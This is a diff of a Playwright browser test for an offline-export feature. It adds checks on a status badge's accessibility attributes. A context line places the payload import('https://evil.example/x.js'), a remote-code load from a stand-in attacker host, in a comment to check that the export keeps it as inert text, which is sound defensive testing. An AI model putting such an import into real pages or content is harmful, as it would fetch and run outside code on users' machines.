@@ -241,6 +241,8 @@ test("Export Offline snapshots mermaid and Chart.js charts for zero-network reop
     await page2.goto(fileUrl(exportedPath));
     await ready(page2);
     await expect(page2.locator("#cmTypeBadge")).toHaveText("Offline");
+    await expect(page2.locator("#cmTypeBadge")).toHaveAttribute("aria-live", "polite");
+    await expect(page2.locator("#cmTypeBadge")).toHaveAttribute("aria-label", /Offline: self-contained and works with no network/);
     await expect(page2.locator("#commentList")).toContainText("offline note with import('https://evil.example/x.js') survives");
 
     const mediaState = await page2.evaluate(() => {
